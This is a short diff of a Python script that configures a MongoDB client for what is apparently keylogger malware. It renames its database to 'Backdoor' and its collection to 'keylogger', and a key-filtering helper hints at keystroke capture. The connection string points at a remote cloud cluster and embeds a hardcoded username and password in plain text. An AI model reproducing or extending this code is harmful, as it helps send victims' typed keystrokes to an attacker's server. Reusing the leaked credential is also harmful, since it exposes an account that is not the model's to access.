@@ -3,8 +3,8 @@ from pymongo import MongoClient
 # Configuración de la conexión a MongoDB
 mongo_uri = "mongodb+srv://iraldejordan10:r5dcxq5RHNDrxt69@jarviscluster.et2fo.mongodb.net/"
 client = MongoClient(mongo_uri)
-db = client["keylogger_db"]       # Nombre de la base de datos
-collection = db["keystrokes"]     # Nombre de la colección
+db = client["Backdoor"]       # Nombre de la base de datos
+collection = db["keylogger"]     # Nombre de la colección
 
 def is_printable_key(key):
     """Determina si la tecla es un carácter imprimible o un espacio."""
